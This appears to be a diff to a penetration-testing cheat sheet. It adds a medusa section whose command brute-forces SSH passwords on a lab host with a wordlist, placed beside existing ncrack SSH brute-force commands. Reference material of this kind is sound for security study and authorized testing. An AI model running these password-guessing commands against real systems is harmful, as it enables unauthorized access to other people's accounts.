@@ -9,6 +9,7 @@
   * [http-post-form](#http-post-form)
   * [ssh](#ssh)
 * [ncrack](#ncrack)
+* [medusa](#medusa)
 * [Header Fuzzing and Manipulation](#header-fuzzing-and-manipulation)
   * [Fetch Header](#fetch-header)
   * [wfuzz](#wfuzz)
@@ -121,6 +122,13 @@ OR
 ncrack -v  -U username -P passwords CL=10 ssh://10.10.10.109
 OR
 ncrack -v  -U username -P passwords CL=10 -p ssh 10.10.10.109
+```
+## medusa
+### ssh
+Ref
+* <https://www.youtube.com/watch?v=j0RjKrON8yI&list=PLPp1uf5KO-28BELlZoFyKNGDaMKZrriOr&index=74>
+```
+medusa -h 192.168.1.102 -u msfadmin -P customwordlist.txt -M ssh -n 22
 ```
 # Header Fuzzing and Manipulation
 ## Fetch Header
